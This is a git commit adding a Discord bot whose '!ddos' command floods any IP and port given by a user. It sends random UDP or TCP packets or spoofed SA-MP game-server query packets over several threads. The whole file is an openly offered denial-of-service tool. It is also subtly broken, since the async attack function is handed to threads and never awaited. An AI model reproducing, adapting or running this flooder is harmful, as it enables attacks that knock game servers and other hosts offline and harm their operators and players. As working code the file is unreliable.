94e4ddbc29a12823a9d676e6ff39f7b5ca7a9fac
Ruzel24 <126597921+Ruzel24@users.noreply.github.com>
2023-05-16 00:11:33 +0800

    Add files via upload

---
+++ bot.py
@@ -0,0 +1,71 @@
+import asyncio
+import discord
+import random
+import socket
+import threading
+
+from discord.ext import commands
+
+# Initialize bot
+intents = discord.Intents.default()
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+# Set max login attempts and cooldown period
+MAX_ATTEMPTS = 5
+COOLDOWN_SECONDS = 60
+
+# Define attack function
+async def attack(ip, port, times, attack_type):
+    # Implement attack code here
+    if attack_type == "udp":
+        # UDP attack code
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            for i in range(times):
+                sock.sendto(random._urandom(1500), (ip, port))
+    elif attack_type == "tcp":
+        # TCP attack code
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((ip, port))
+            for i in range(times):
+                sock.send(random._urandom(1500))
+    elif attack_type == "samp":
+        # SA-MP attack code
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            for i in range(times):
+                sock.sendto(b'\xff' * 4 + b'SAMP' + random._urandom(8), (ip, port))
+
+# Define on_ready function
+@bot.event
+async def on_ready():
+    print("Logged in as {0.user}".format(bot))
+
+# Define attack command
+@bot.command()
+async def ddos(ctx, ip: str, port: int, times: int, threads: int, attack_type: str):
+    attempts_left = MAX_ATTEMPTS - bot.logins.get(ctx.author.id, {'attempts': 0})['attempts']
+
+    if attempts_left <= 0:
+        remaining_time = bot.logins[ctx.author.id]['next_login'] - asyncio.get_event_loop().time()
+        await ctx.send(f"Maximum login attempts reached. Please try again in {int(remaining_time)} seconds.")
+        return
+
+    # Check if attack type is valid
+    if attack_type not in ['udp', 'tcp', 'samp']:
+        await ctx.send(f"Invalid attack type '{attack_type}'. Please choose 'udp', 'tcp', or 'samp'.")
+        return
+
+    # Start the attack
+    for i in range(threads):
+        t = threading.Thread(target=attack, args=(ip, port, times, attack_type))
+        t.start()
+
+    bot.logins.setdefault(ctx.author.id, {'attempts': 0, 'next_login': 0})
+    bot.logins[ctx.author.id]['attempts'] += 1
+    bot.logins[ctx.author.id]['next_login'] = asyncio.get_event_loop().time() + COOLDOWN_SECONDS
+
+    attempts_left = MAX_ATTEMPTS - bot.logins[ctx.author.id]['attempts']
+    await ctx.send(f"Attack started on {ip}:{port} ({attack_type}) with {threads} threads. {attempts_left} login attempts remaining before cooldown.")
+
+# Run the bot
+bot.logins = {}
+bot.run('TOKEN') # Replace 'TOKEN' with your bot's token.
